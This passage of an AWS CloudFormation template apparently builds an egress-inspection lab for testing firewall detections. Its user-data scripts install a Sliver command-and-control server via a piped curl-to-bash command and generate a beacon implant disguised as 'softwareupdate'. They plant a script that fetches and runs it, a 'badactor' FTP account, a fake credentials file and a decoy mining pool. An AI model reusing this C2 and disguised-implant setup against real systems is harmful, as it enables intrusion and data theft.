        - Key: Name
          Value: !Sub "egress-public-route-table-${AWS::StackName}"

  SubnetCPublicCorpRoute:
    Type: AWS::EC2::Route
    DependsOn: AttachEgressVPC
    Properties:
      DestinationCidrBlock: "10.0.0.0/8"
      TransitGatewayId: !Ref CentralTransitGateway
      RouteTableId: !Ref SubnetCPublicRouteTable

  SubnetCPublicDefaultRoute:
    Type: AWS::EC2::Route
    DependsOn: AttachEgressGateway
    Properties:
      DestinationCidrBlock: "0.0.0.0/0"
      GatewayId: !Ref EgressInternetGateway
      RouteTableId: !Ref SubnetCPublicRouteTable

  SubnetCPublicRouteTableAssociation:
    Type: AWS::EC2::SubnetRouteTableAssociation
    DependsOn: SubnetCPublic
    Properties:
      RouteTableId: !Ref SubnetCPublicRouteTable
      SubnetId: !Ref SubnetCPublic

  # Egress VPC TGW subnet routes through NAT Gateway
  EgressTGWRouteTable:
    Type: AWS::EC2::RouteTable
    Properties:
      VpcId: !Ref EgressVPC
      Tags:
        - Key: Name
          Value: !Sub "egress-tgw-route-table-${AWS::StackName}"

  # Route egress traffic through NAT Gateway
  EgressTGWDefaultRoute:
    Type: AWS::EC2::Route
    DependsOn: SubnetCNATGateway
    Properties:
      DestinationCidrBlock: "0.0.0.0/0"
      NatGatewayId: !Ref SubnetCNATGateway
      RouteTableId: !Ref EgressTGWRouteTable

  # Egress public subnet routes
  EgressPublicRouteTable:
    Type: AWS::EC2::RouteTable
    Properties:
      VpcId: !Ref EgressVPC
      Tags:
        - Key: Name
          Value: !Sub "egress-public-route-table-${AWS::StackName}"

  EgressPublicDefaultRoute:
    Type: AWS::EC2::Route
    DependsOn: AttachEgressGateway
    Properties:
      DestinationCidrBlock: "0.0.0.0/0"
      GatewayId: !Ref EgressInternetGateway
      RouteTableId: !Ref EgressPublicRouteTable



  # Transit Gateway Route Tables
  SpokeRouteTable:
    Type: "AWS::EC2::TransitGatewayRouteTable"
    Properties:
      Tags:
        - Key: Name
          Value: !Sub "spoke-route-table-${AWS::StackName}"
      TransitGatewayId: !Ref CentralTransitGateway
      
  InspectionRouteTable:
    Type: "AWS::EC2::TransitGatewayRouteTable"
    Properties:
      Tags:
        - Key: Name
          Value: !Sub "inspection-route-table-${AWS::StackName}"
      TransitGatewayId: !Ref CentralTransitGateway

  EgressRouteTable:
    Type: "AWS::EC2::TransitGatewayRouteTable"
    Properties:
      Tags:
        - Key: Name
          Value: !Sub "egress-route-table-${AWS::StackName}"
      TransitGatewayId: !Ref CentralTransitGateway

  AssociateProdVPCRouteTable:
    Type: AWS::EC2::TransitGatewayRouteTableAssociation
    Properties:
      TransitGatewayAttachmentId: !Ref AttachProdVPC
      TransitGatewayRouteTableId: !Ref SpokeRouteTable

  AssociateDevVPCRouteTable:
    Type: AWS::EC2::TransitGatewayRouteTableAssociation
    Properties:
      TransitGatewayAttachmentId: !Ref AttachDevVPC
      TransitGatewayRouteTableId: !Ref SpokeRouteTable

  AssociateEgressVPCRouteTable:
    Type: AWS::EC2::TransitGatewayRouteTableAssociation
    Properties:
      TransitGatewayAttachmentId: !Ref AttachEgressVPC
      TransitGatewayRouteTableId: !Ref EgressRouteTable

  AssociatePublicInternetVPCRouteTable:
    Type: AWS::EC2::TransitGatewayRouteTableAssociation
    Properties:
      TransitGatewayAttachmentId: !Ref AttachPublicInternetVPC
      TransitGatewayRouteTableId: !Ref SpokeRouteTable

  AssociateInspectionVPCRouteTable:
    Type: AWS::EC2::TransitGatewayRouteTableAssociation
    DependsOn: EgressFirewall
    Properties:
      TransitGatewayAttachmentId: !GetAtt EgressFirewall.TransitGatewayAttachmentId
      TransitGatewayRouteTableId: !Ref InspectionRouteTable

  # Propagate spoke routes to inspection route table for return traffic
  PropagateProdVPCRoute:
    Type: AWS::EC2::TransitGatewayRouteTablePropagation
    Properties:
      TransitGatewayAttachmentId: !Ref AttachProdVPC
      TransitGatewayRouteTableId: !Ref InspectionRouteTable

  PropagateDevVPCRoute:
    Type: AWS::EC2::TransitGatewayRouteTablePropagation
    Properties:
      TransitGatewayAttachmentId: !Ref AttachDevVPC
      TransitGatewayRouteTableId: !Ref InspectionRouteTable

  PropagatePublicInternetVPCRoute:
    Type: AWS::EC2::TransitGatewayRouteTablePropagation
    Properties:
      TransitGatewayAttachmentId: !Ref AttachPublicInternetVPC
      TransitGatewayRouteTableId: !Ref InspectionRouteTable

  # Route all spoke traffic to inspection VPC
  SpokeInspectionRoute:
    Type: AWS::EC2::TransitGatewayRoute
    DependsOn: EgressFirewall
    Properties:
      DestinationCidrBlock: "0.0.0.0/0"
      TransitGatewayAttachmentId: !GetAtt EgressFirewall.TransitGatewayAttachmentId
      TransitGatewayRouteTableId: !Ref SpokeRouteTable

  # Route all inspection VPC traffic to egress VPC
  InspectionToEgressRoute:
    Type: AWS::EC2::TransitGatewayRoute
    Properties:
      DestinationCidrBlock: "0.0.0.0/0"
      TransitGatewayAttachmentId: !Ref AttachEgressVPC
      TransitGatewayRouteTableId: !Ref InspectionRouteTable

  # Route egress VPC traffic back to inspection for return traffic  
  EgressVPCtoInspectionVPCRoute:
    Type: AWS::EC2::TransitGatewayRoute
    DependsOn: EgressFirewall
    Properties:
      DestinationCidrBlock: "0.0.0.0/0"
      TransitGatewayAttachmentId: !GetAtt EgressFirewall.TransitGatewayAttachmentId
      TransitGatewayRouteTableId: !Ref EgressRouteTable
# Public Internet VPC for Egress Tests
  PublicInternetVPC:
    Metadata:
      cfn_nag:
        rules_to_suppress:
          - id: W60
            reason: "VPC Flow logs not used in workshop"
    Type: AWS::EC2::VPC
    Properties:
      CidrBlock: "10.200.0.0/16"
      EnableDnsHostnames: true
      EnableDnsSupport: true
      Tags:
        - Key: Name
          Value: PublicInternetVPC

  PublicInternetSubnet:
    Metadata:
      cfn_nag:
        rules_to_suppress:
          - id: W33
            reason: "Public Subnet, public IPs required"
    Type: AWS::EC2::Subnet
    Properties:
      VpcId: !Ref PublicInternetVPC
      CidrBlock: "10.200.1.0/24"
      AvailabilityZone: !Select [0, !GetAZs ""]
      MapPublicIpOnLaunch: true
      Tags:
        - Key: Name
          Value: PublicInternet-Public-Subnet

  PublicInternetTGWSubnet:
    Type: AWS::EC2::Subnet
    Properties:
      VpcId: !Ref PublicInternetVPC
      CidrBlock: "10.200.0.0/28"
      AvailabilityZone: !Ref AvailabilityZoneSelection
      MapPublicIpOnLaunch: false
      Tags:
        - Key: Name
          Value: !Sub "public-internet-tgw-${AWS::StackName}"

  PublicInternetIGW:
    Type: AWS::EC2::InternetGateway
    Properties:
      Tags:
      - Key: Name
        Value: PublicInternet-IGW

  PublicInternetGWAttachment:
    Type: AWS::EC2::VPCGatewayAttachment
    Properties:
      InternetGatewayId: !Ref PublicInternetIGW
      VpcId: !Ref PublicInternetVPC

  PublicInternetSG:
    Metadata:
      cfn_nag:
        rules_to_suppress:
          - id: W40
            reason: "Security Groups egress with an IpProtocol of -1 is required"
          - id: W5
            reason: "Security Groups found with cidr open to world on egress is required"
          - id: W42
            reason: "Security Groups ingress with an ipProtocol of -1 is required"
          - id: W9
            reason: "Security Groups found with ingress cidr that is not /32 is required"
          - id: W36
            reason: "Description is applied"
    Type: AWS::EC2::SecurityGroup
    Properties:
      GroupDescription: 'Public Internet Host Security Group'
      VpcId: !Ref PublicInternetVPC
      SecurityGroupIngress:
        - IpProtocol: '-1'
          Description: Allowing inbound connection from 10.0.0.0/8 CIDR.
          FromPort: -1
          ToPort: -1
          CidrIp: 10.0.0.0/8
        - IpProtocol: '-1'
          Description: Allowing inbound connection from NAT Gateway
          CidrIp: !Sub "${SubnetCNATEIP}/32"
      SecurityGroupEgress:
        - CidrIp: 0.0.0.0/0
          Description: Allowing outbound connection to 0.0.0.0/0 CIDR.
          IpProtocol: "-1"
          FromPort: -1
          ToPort: -1

  PublicInternetHostRole:
    Type: AWS::IAM::Role
    Properties:
      AssumeRolePolicyDocument:
        Version: '2012-10-17'
        Statement:
          - Effect: Allow
            Principal:
              Service: ec2.amazonaws.com
            Action: sts:AssumeRole
      ManagedPolicyArns:
        - arn:aws:iam::aws:policy/AmazonSSMFullAccess

  PublicInternetHostProfile:
    Type: AWS::IAM::InstanceProfile
    Properties:
      Path: "/"
      Roles:
        - !Ref PublicInternetHostRole

  PublicInternetHost:
    Type: AWS::EC2::Instance
    Properties:
      ImageId: !Ref LatestAmiId
      InstanceType: t3.small
      IamInstanceProfile: !Ref PublicInternetHostProfile
      SubnetId: !Ref PublicInternetSubnet
      SecurityGroupIds:
        - !Ref PublicInternetSG
      Tags:
        - Key: Name
          Value: "INTERNET - Public Host on Internet"
      UserData:
        Fn::Base64: |
          #!/bin/bash -ex

          # Update system
          yum update -y

          # Install required services and dependencies
          yum install -y httpd vsftpd nc php php-common php-fpm

          # Disable SELinux
          setenforce 0

          # Disable SELinux permanently
          sed -i 's/SELINUX=enforcing/SELINUX=disabled/' /etc/selinux/config

          # Enable and start services
          systemctl enable httpd
          systemctl start httpd

          # Install and start Apache httpd with mod_ssl (for SNI Spoofing test)
          yum install -y httpd mod_ssl
          
          # Configure Apache to listen on various ports
          sed -i '/Listen 80/a Listen 8080' /etc/httpd/conf/httpd.conf
          sed -i '/Listen 8080/a Listen 1389' /etc/httpd/conf/httpd.conf
          sed -i '/Listen 1389/a Listen 4444' /etc/httpd/conf/httpd.conf
          sed -i '/Listen 4444/a Listen 443' /etc/httpd/conf/httpd.conf

          # Generate self-signed certificate for SNI spoofing test
          mkdir -p /etc/httpd/ssl
          openssl req -new -newkey rsa:2048 -days 365 -nodes -x509 \
            -keyout /etc/httpd/ssl/apache-selfsigned.key \
            -out /etc/httpd/ssl/apache-selfsigned.crt \
            -subj "/C=US/ST=State/L=City/O=Organization/OU=Department/CN=checkip.amazonaws.com"

          # Keep SSL on port 443 (default) - remove the default Listen 443 from ssl.conf to avoid duplicate
          sed -i 's/^Listen 443 https$//' /etc/httpd/conf.d/ssl.conf

          # Add the VirtualHost entry for SSL (port 443) with SNI for checkip.amazonaws.com
          cat << 'EOFSSL' >> /etc/httpd/conf.d/ssl.conf

          <VirtualHost *:443>
            ServerName checkip.amazonaws.com
            ServerAdmin webmaster@localhost
            DocumentRoot /var/www/html
            SSLEngine on
            SSLCertificateFile /etc/httpd/ssl/apache-selfsigned.crt
            SSLCertificateKeyFile /etc/httpd/ssl/apache-selfsigned.key
            <Directory "/var/www/html">
              AllowOverride All
            </Directory>
            ErrorLog logs/ssl_error_log
            CustomLog logs/ssl_access_log common
          </VirtualHost>
          EOFSSL

          # Create main PHP-FPM configuration
          cat << 'EOF' > /etc/php-fpm.conf
          [global]
          pid = /run/php-fpm/php-fpm.pid
          error_log = /var/log/php-fpm/error.log
          daemonize = yes

          include=/etc/php-fpm.d/*.conf
          EOF

          # Configure PHP-FPM
          cat << 'EOF' > /etc/php-fpm.d/www.conf
          [www]
          user = apache
          group = apache
          listen = /run/php-fpm/www.sock
          listen.owner = apache
          listen.group = apache
          listen.mode = 0660

          pm = dynamic
          pm.max_children = 50
          pm.start_servers = 5
          pm.min_spare_servers = 5
          pm.max_spare_servers = 35
          EOF

          # Create required directories
          mkdir -p /run/php-fpm /var/log/php-fpm
          chown apache:apache /run/php-fpm /var/log/php-fpm
          chmod 755 /run/php-fpm /var/log/php-fpm

          # Configure PHP handler
          cat << 'EOF' > /etc/httpd/conf.d/php.conf
          <FilesMatch \.php$>
              SetHandler "proxy:unix:/run/php-fpm/www.sock|fcgi://localhost"
          </FilesMatch>
          AddType application/x-httpd-php .php
          EOF

          # Configure Apache handlers
          cat << 'EOF' > /etc/httpd/conf.d/handlers.conf
          <Directory "/var/www/html">
              Options +ExecCGI
              AddHandler application/x-httpd-php .php
              <FilesMatch "\.php$">
                  SetHandler "proxy:unix:/run/php-fpm/www.sock|fcgi://localhost"
              </FilesMatch>
          </Directory>
          LoadModule proxy_module modules/mod_proxy.so
          LoadModule proxy_fcgi_module modules/mod_proxy_fcgi.so
          EOF

          # Start Apache
          systemctl start httpd
          systemctl enable httpd

          # Update sshd to listen on port 2222 in addition to port 22
          sed -i '/^#ListenAddress ::/a Port 22\nPort 2222' /etc/ssh/sshd_config
          systemctl restart sshd

          # Create directories and files for cryptomining tests
          mkdir -p /var/www/html/pool

          # Create a dummy executable file
          dd if=/dev/zero of=/var/www/html/cpu64.exe bs=1M count=1

          # Create mining pool configuration file
          cat << 'EOF' > /var/www/html/pool.config
          pool.monero.hashvault.pro:5555;x;x;
          cpubase_usage = IDLE power
          pool = pool.monero.hashvault.pro:5555
          wallet = 4279hWaT5J7ioCsVPXZahGHfxhqJ3Y3gzT1uxxG8aEVGWBYkbnVB61Vfx9weGy79R8YAQE1ouKAan56hRkfTQdp76DKpvi6
          EOF

          # Create mining pool endpoint with improved PHP
          cat << 'EOF' > /var/www/html/pool/index.php
          <?php
          header('Content-Type: application/json');
          header('X-Content-Type-Options: nosniff');
          header('X-Frame-Options: DENY');
          header('X-XSS-Protection: 1; mode=block');

          if ($_SERVER['REQUEST_METHOD'] === 'POST') {
              $input = file_get_contents('php://input');
              if (strpos($input, '"method":"mining.authorize"') !== false && 
                  strpos($input, '"params":["pioner.1","12345"]') !== false) {
                  echo json_encode([
                      'id' => 1,
                      'result' => true,
                      'error' => null,
                      'worker_name' => 'pioner.1'
                  ]);
                  exit;
              }
          }
          http_response_code(403);
          echo json_encode(['error' => 'Unauthorized']);
          ?>
          EOF

          # Set proper permissions
          find /var/www/html -type f -exec chmod 644 {} \;
          chown -R apache:apache /var/www/html/

          # Create .htaccess with security headers
          cat << 'EOF' > /var/www/html/.htaccess
          Header always set X-Content-Type-Options "nosniff"
          Header always set X-Frame-Options "DENY"
          Header always set X-XSS-Protection "1; mode=block"
          Header always set Content-Security-Policy "default-src 'self'"

          <Files "pool.config">
              Header set Content-Type "text/plain"
          </Files>
          <Files "cpu64.exe">
              Header set Content-Type "application/octet-stream"
          </Files>
          EOF

          chmod 644 /var/www/html/.htaccess
          chown apache:apache /var/www/html/.htaccess

          # Enable required Apache modules
          cat << 'EOF' > /etc/httpd/conf.d/security.conf
          LoadModule headers_module modules/mod_headers.so
          LoadModule rewrite_module modules/mod_rewrite.so
          EOF

          # Configure main Apache security settings
          cat << 'EOF' >> /etc/httpd/conf/httpd.conf
          ServerTokens Prod
          ServerSignature Off
          TraceEnable Off

          <Directory "/var/www/html">
              AllowOverride All
              Options -Indexes +FollowSymLinks
              Require all granted
          </Directory>
          EOF

          chown -R apache:apache /var/www/html
          chmod 755 /var/www/html

          # Restart services to apply all changes
          systemctl enable php-fpm
          systemctl start php-fpm
          systemctl restart php-fpm
          systemctl restart httpd


  SliverServer:
    Type: AWS::EC2::Instance
    DependsOn:
      - EgressNetworkInterface
      - EgressFirewall
      - SubnetCNATGateway
    Properties:
      ImageId: !Ref AmazonLinux2AMI
      InstanceType: t3.small
      IamInstanceProfile: !Ref PublicInternetHostProfile
      NetworkInterfaces:
        - NetworkInterfaceId: !Ref EgressNetworkInterface
          DeviceIndex: '0'
      Tags:
        - Key: Name
          Value: "SLIVER - Command and Control Server"
      UserData:
        Fn::Base64: !Sub |
            #!/bin/bash -ex
            date > /tmp/image.log
            yum update -y
            # yum install -y https://s3.${AWS::Region}.amazonaws.com/amazon-ssm-${AWS::Region}/latest/linux_amd64/amazon-ssm-agent.rpm
            # systemctl start amazon-ssm-agent
            # /usr/bin/amazon-ssm-agent
            if ! id -u ssm-user >/dev/null 2>&1; then
               useradd -m -d /home/ssm-user -s /bin/bash ssm-user
            fi
            if [ ! -d /home/ssm-user ]; then
               mkdir -p /home/ssm-user
               chown ssm-user:ssm-user /home/ssm-user
               chmod 700 /home/ssm-user
            fi
            echo 'ssm-user ALL=(ALL) NOPASSWD:ALL' > /etc/sudoers.d/ssm-user
            # Install and configure FTP server
            yum install -y vsftpd
            cat << 'EOF' > /etc/vsftpd/vsftpd.conf
            ftp_data_port=21
            listen_port=21
            anonymous_enable=NO
            pasv_enable=YES
            pasv_min_port=64000
            pasv_max_port=64001
            port_enable=YES
            pasv_addr_resolve=YES
            write_enable=YES
            connect_from_port_20=YES
            ascii_upload_enable=YES
            local_enable=YES
            chroot_local_user=YES
            allow_writeable_chroot=YES
            userlist_enable=YES
            userlist_file=/etc/vsftpd/user_list
            userlist_deny=NO
            pam_service_name=vsftpd
            EOF

            # Configure FTP
            adduser badactor
            echo 5VXcbio8D3nsly | passwd --stdin badactor
            echo badactor | sudo tee a /etc/vsftpd/user_list
            mkdir -p /home/badactor/ftp/upload
            chmod 550 /home/badactor/ftp
            chmod 750 /home/badactor/ftp/upload
            chown -R badactor: /home/badactor/ftp

            # Add the public IP to vsftpd config
            { echo -n "pasv_address="; curl -sS "http://checkip.amazonaws.com"; } >> /etc/vsftpd/vsftpd.conf

            # Start the ftp service and set it to launch when the system boots with the following
            systemctl start vsftpd
            systemctl enable vsftpd
            systemctl status vsftpd > /tmp/vsfptd.status


            # Install and start Apache httpd with mod_ssl (for SNI Spoofing test)
            yum install -y httpd mod_ssl
            sed -i '/Listen 80/a Listen 8080' /etc/httpd/conf/httpd.conf
            sed -i '/Listen 8080/a Listen 1389' /etc/httpd/conf/httpd.conf
            sed -i '/Listen 1389/a Listen 443' /etc/httpd/conf/httpd.conf 

            mkdir -p /etc/httpd/ssl
              openssl req -new -newkey rsa:2048 -days 365 -nodes -x509 \
              -keyout /etc/httpd/ssl/apache-selfsigned.key \
              -out /etc/httpd/ssl/apache-selfsigned.crt \
              -subj "/C=US/ST=State/L=City/O=Organization/OU=Department/CN=checkip.amazonaws.com"  

            # Listen on 8443 instead off 443 since it's being used for other pre-existing Suricata rules tests
            sed -i 's/^Listen 443/Listen 8443/' /etc/httpd/conf.d/ssl.conf

            # Add the VirtualHost entry for SSL (port 8443) with SNI for checkip.amazonaws.com
            cat <<EOL >> /etc/httpd/conf.d/ssl.conf

            <VirtualHost *:8443>
              ServerName checkip.amazonaws.com
              ServerAdmin webmaster@localhost
              DocumentRoot /var/www/html
              SSLEngine on
              SSLCertificateFile /etc/httpd/ssl/apache-selfsigned.crt
              SSLCertificateKeyFile /etc/httpd/ssl/apache-selfsigned.key
              <Directory "/var/www/html">
                AllowOverride All
              </Directory>
              ErrorLog logs/ssl_error_log
              CustomLog logs/ssl_access_log common
            </VirtualHost>
            EOL

            systemctl start httpd
            systemctl enable httpd

            # Update sshd to Listen on port 2222
            sed -i '/^#ListenAddress ::/a Port 22\nPort 2222' /etc/ssh/sshd_config
            systemctl restart sshd


            # Install, Configure Samba
            yum install samba samba-client samba-common -y
            cat << 'EOF' > /etc/samba/smb.conf
            [share_name]
            path = /home/badactor/ftp/upload
            writable = yes
            browsable = yes
            valid users = badactor
            EOF
            # Start Samba services
            systemctl start smb
            systemctl start nmb

            # Generate Sliver implant
            cd /tmp

            # Create directory to store c2_implant
            mkdir /tmp/c2_implant

            # Install sliver
            curl https://sliver.sh/install|sudo bash

            # Ensure it will always run on startup 
            sudo systemctl enable sliver
          
            # Install expect for use with sliver implant and listener config
            yum install expect -y


            # C2_IP variable for script below
            C2_IP=${EgressIP}

            # Generate Sliver implant and set up listener
            cat << EOF > /tmp/sliver_expect_script.exp
            #!/usr/bin/expect -f

            set timeout 300
            spawn /usr/local/bin/sliver

            expect {
              -re {sliver[\x1b\[0m]* >} { send "generate beacon --http $C2_IP:4444 --dns 1.dnstunnel.com. --mtls $C2_IP --os linux --arch amd64 --format exe --seconds 5 --reconnect 5 --jitter 0 --save /tmp/c2_implant/softwareupdate\r" }
            }

            expect {
              -re {sliver[\x1b\[0m]* >}
            }

            expect {
              -re {sliver[\x1b\[0m]* >} { send "http -l 4444\r" }
            }

            expect {
              -re {sliver[\x1b\[0m]* >} { send "mtls\r" }
            }

            expect {
              -re {sliver[\x1b\[0m]* >} { send "dns -D -d 1.dnstunnel.com\r" }
            }

            expect {
              -re {sliver[\x1b\[0m]* >} { send "exit\r" }
            }

            expect eof
            EOF

            chmod +x /tmp/sliver_expect_script.exp
            
            # Wait for Sliver daemon to be ready
            echo "Waiting for Sliver daemon to start..."
            retry_count=0
            while [ $retry_count -lt 30 ]; do
              if netstat -ln | grep -q ":31337"; then
                echo "Sliver daemon is ready"
                sleep 5  # Give it a few more seconds to fully initialize
                break
              fi
              echo "Waiting for Sliver daemon... attempt $((retry_count + 1))"
              sleep 10
              retry_count=$((retry_count + 1))
            done
            
            if [ $retry_count -eq 30 ]; then
              echo "Sliver daemon failed to start after 5 minutes"
              exit 1
            fi
            
            /tmp/sliver_expect_script.exp

            # Compress the implant folder
            # tar -czf /tmp/c2_implant.tar.gz -C /tmp c2_implant

            # Copy to Apache document root
            cp /tmp/c2_implant/softwareupdate /var/www/html/softwareupdate
            chown apache:apache /var/www/html/softwareupdate
            chmod 644 /var/www/html/softwareupdate

# Route53 Resolver Resources for DNS Tunneling Detection
  IngressDNSTrafficSecurityGroup:
    Type: AWS::EC2::SecurityGroup
    Properties:
      GroupDescription: Allow DNS access on TCP and UDP for DNS ingress
      VpcId: !Ref ProdVPC
      SecurityGroupIngress:
        - IpProtocol: tcp
          FromPort: 53
          ToPort: 53
          CidrIp: "10.1.0.0/16"  # Private CIDR of ProdVPC
          Description: "Allow DNS TCP traffic from ProdVPC"
        - IpProtocol: udp
          FromPort: 53
          ToPort: 53
          CidrIp: "10.1.0.0/16"
          Description: "Allow DNS UDP traffic from ProdVPC"
      Tags:
        - Key: Name
          Value: IngressDNSTrafficSecurityGroup

  Route53OutboundResolverEndpoint:
    Type: AWS::Route53Resolver::ResolverEndpoint
    Properties:
      Direction: OUTBOUND
      Name: ProdVPC-Route53-Outbound-Resolver
      SecurityGroupIds:
        - !Ref IngressDNSTrafficSecurityGroup
      IpAddresses:
        - SubnetId: !Ref ProdVPCWorkloadSubnet
          Ip: 10.1.1.20
        - SubnetId: !Ref ProdVPCWorkloadSubnet
          Ip: 10.1.1.21
      Tags:
        - Key: Name
          Value: Route53OutboundResolverEndpoint

  Route53ResolverRule:
    Type: AWS::Route53Resolver::ResolverRule
    Properties:
      DomainName: "dnstunnel.com"
      Name: ProdVPC-DNSTunnel-Rule
      RuleType: FORWARD
      ResolverEndpointId: !Ref Route53OutboundResolverEndpoint
      TargetIps:
        - Ip: !GetAtt SliverServer.PrivateIpAddress
          Port: 53
      Tags:
        - Key: Name
          Value: Route53ResolverRule

  # Associate the Resolver Rule with ProdVPC
  Route53ResolverRuleAssociation:
    Type: AWS::Route53Resolver::ResolverRuleAssociation
    Properties:
      Name: ProdVPC-DNSTunnel-Rule-Association
      ResolverRuleId: !Ref Route53ResolverRule
      VPCId: !Ref ProdVPC



# Test Instances - for egress tests
  CompromisedProdHost:
    Type: AWS::EC2::Instance
    DependsOn:
     - EgressNetworkInterface
     - EgressFirewall
     - SubnetCNATGateway
     - ProdVPC1WorkloadInstance1
    Metadata:
      AWS::CloudFormation::Init:
        configSets:
          Scanner_Install:
            - configure_scanner
        configure_scanner:
          commands:
            add_hosts_entry:
              command: !Sub 'echo "${EgressIP} softwareupdate.com" >> /etc/hosts'
          files:
            /usr/bin/updatesoftware:
              mode: "000755"
              content: !Sub |
                #!/bin/bash
                #Script to download Sliver implant disguised as a software update
                echo 'DOWNLOADING SOFTWARE UPDATE...'
                cd /tmp
                wget http://softwareupdate.com/softwareupdate
                sudo chmod +x softwareupdate
                sudo ./softwareupdate &
                echo 'SOFTWARE UPDATE COMPLETE!'
            /tmp/credentials.txt:
              mode: "000755"
              content: !Sub |
                # Database creds
                username=admin@57.88.92.104
                password=f$x$@Dfksu&*#$CXyv
    Properties:
      ImageId: !Ref AmazonLinux2AMI
      InstanceType: t3.small
      SubnetId: !Ref ProdVPCWorkloadSubnet
      IamInstanceProfile: !Ref ProdVPCInstanceProfile
      SecurityGroupIds:
        - !Ref ProdVPCSecGroup
      Tags:
        - Key: Name
          Value: "PROD - Compromised Host"
      UserData:
        Fn::Base64: !Sub |
          #!/bin/bash -ex
          
          # Wait for internet connectivity
          retry_count=0
          while [ $retry_count -lt 30 ]; do
            TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" 2>/dev/null)
            if curl -s --connect-timeout 5 -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/instance-id > /dev/null; then
              if curl -s --connect-timeout 10 https://aws.amazon.com > /dev/null; then
                echo "Internet connectivity established"
                break
              fi
            fi
            echo "Waiting for internet connectivity... attempt $((retry_count + 1))"
            sleep 10
            retry_count=$((retry_count + 1))
          done
          
          if [ $retry_count -eq 30 ]; then
            echo "Failed to establish internet connectivity after 5 minutes"
            exit 1
          fi
          
          yum update -y
          yum install -y aws-cfn-bootstrap
          amazon-linux-extras install epel -y
          yum install knot-utils -y 
          yum install samba-client -y
          yum install nc -y
          yum install ftp -y
          systemctl start sshd
          amazon-linux-extras enable python3
          yum install -y python3 --disablerepo amzn2-core
          yum install -y curl git python-pip
          echo "${EgressIP} testhost.aws" >> /etc/hosts
          echo "${EgressIP} softwareupdate.com" >> /etc/hosts
          wget -O /tmp/flightsim_2.5.1_linux_64-bit.rpm https://github.com/alphasoc/flightsim/releases/download/v2.5.1/flightsim_2.5.1_linux_64-bit.rpm
          yum install -y /tmp/flightsim_2.5.1_linux_64-bit.rpm
          wget -O /tmp/setupcerts.zip https://ws-assets-prod-iad-r-iad-ed304a55c2ca1aee.s3.us-east-1.amazonaws.com/cbfa9f18-1175-4916-b7e7-e33dbbca9f9d/setupcerts.zip
          cd /tmp
          unzip setupcerts.zip
          cd setupcerts/
          bash create_certs
          yum install ca-certificates
          update-ca-trust force-enable
          cp /tmp/setupcerts/out-dir/root/ca/certs/ca.cert.pem /etc/pki/ca-trust/source/anchors/
          update-ca-trust extract
          
          # Configure curl to use the system CA bundle
          echo 'export CURL_CA_BUNDLE=/etc/pki/tls/certs/ca-bundle.crt' >> /etc/profile.d/curl-ca-bundle.sh
          chmod +x /etc/profile.d/curl-ca-bundle.sh
          export CURL_CA_BUNDLE=/etc/pki/tls/certs/ca-bundle.crt
          
          aws acm import-certificate --certificate file:///tmp/setupcerts/out-dir/root/ca/intermediate/certs/intermediate.cert.pem --private-key file:///tmp/setupcerts/out-dir/root/ca/intermediate/private/intermediate.key.pem --certificate-chain file:///tmp/setupcerts/out-dir/root/ca/intermediate/certs/ca-chain.cert.pem --region us-east-1 --tags Key=name,Value=tls-inspection-certificate

          # Download sliver implant
          cd /tmp
          # wget http://${EgressIP}/softwareupdate

          # Download TLS inspection CA certificate from S3 and update trust store
          yum install ca-certificates -y
          update-ca-trust force-enable
          
          # Get the S3 bucket name using tags
          BUCKET_NAME=$(aws s3api list-buckets --query "Buckets[].Name" --output text | xargs -n1 | while read bucket; do
            tags=$(aws s3api get-bucket-tagging --bucket "$bucket" 2>/dev/null || echo "")
            if echo "$tags" | grep -q "privatelink-candidate"; then
              echo "$bucket"
              break
            fi
          done)
          
          # Wait for certificate to be uploaded to S3 (retry up to 30 times with 10 second intervals)
          CERT_DOWNLOADED=false
          for i in {1..30}; do
            if [ -n "$BUCKET_NAME" ] && aws s3 cp s3://$BUCKET_NAME/tls-certs/ca.cert.pem /etc/pki/ca-trust/source/anchors/ca.cert.pem 2>/dev/null; then
              echo "Certificate downloaded successfully"
              CERT_DOWNLOADED=true
              break
            fi
            echo "Waiting for certificate to be available in S3... attempt $i"
            sleep 10
          done
          
          if [ "$CERT_DOWNLOADED" = "true" ]; then
            update-ca-trust extract
            
            # Configure curl to use the system CA bundle
            echo 'export CURL_CA_BUNDLE=/etc/pki/tls/certs/ca-bundle.crt' >> /etc/profile.d/curl-ca-bundle.sh
            chmod +x /etc/profile.d/curl-ca-bundle.sh
            export CURL_CA_BUNDLE=/etc/pki/tls/certs/ca-bundle.crt
          else
            echo "WARNING: Certificate not available after 30 attempts. Continuing without TLS inspection certificate."
          fi
        

          /opt/aws/bin/cfn-init -v --stack ${AWS::StackName} --resource CompromisedProdHost --configsets Scanner_Install --region ${AWS::Region}



  PublicInternetRouteTable:
    Type: AWS::EC2::RouteTable
    Properties:
      VpcId: !Ref PublicInternetVPC
      Tags:
        - Key: Name
          Value: PublicInternet-RTB

  PublicInternetTGWRouteTable:
    Type: AWS::EC2::RouteTable
    Properties:
      VpcId: !Ref PublicInternetVPC
      Tags:
        - Key: Name
          Value: !Sub "public-internet-tgw-route-table-${AWS::StackName}"

  PublicInternetTGWRouteTableAssociation:
    Type: AWS::EC2::SubnetRouteTableAssociation
    Properties:
      RouteTableId: !Ref PublicInternetTGWRouteTable
      SubnetId: !Ref PublicInternetTGWSubnet

  PublicInternetTGWPrivateRoute:
    Type: AWS::EC2::Route
    DependsOn: AttachPublicInternetVPC
    Properties:
      DestinationCidrBlock: "10.0.0.0/8"
      TransitGatewayId: !Ref CentralTransitGateway
      RouteTableId: !Ref PublicInternetTGWRouteTable

  EgressNetworkInterface:
    Type: AWS::EC2::NetworkInterface
    Properties:
      SubnetId: !Ref PublicInternetSubnet
      GroupSet:
        - !Ref PublicInternetSG

  EgressIP:
    DependsOn:
      - PublicInternetGWAttachment
    Type: AWS::EC2::EIP
    Properties:
      Domain: vpc

  EgressIPAssociation:
    Type: AWS::EC2::EIPAssociation
    Properties:
      AllocationId: !GetAtt EgressIP.AllocationId
      NetworkInterfaceId: !Ref EgressNetworkInterface

  PublicInternetRoute:
    Type: AWS::EC2::Route
    DependsOn: PublicInternetGWAttachment
    Properties:
      RouteTableId: !Ref PublicInternetRouteTable
      DestinationCidrBlock: 0.0.0.0/0
      GatewayId: !Ref PublicInternetIGW

  PublicInternetSubnetPrivateRoute:
    Type: AWS::EC2::Route
    DependsOn: AttachPublicInternetVPC
    Properties:
      DestinationCidrBlock: "10.0.0.0/8"
      TransitGatewayId: !Ref CentralTransitGateway
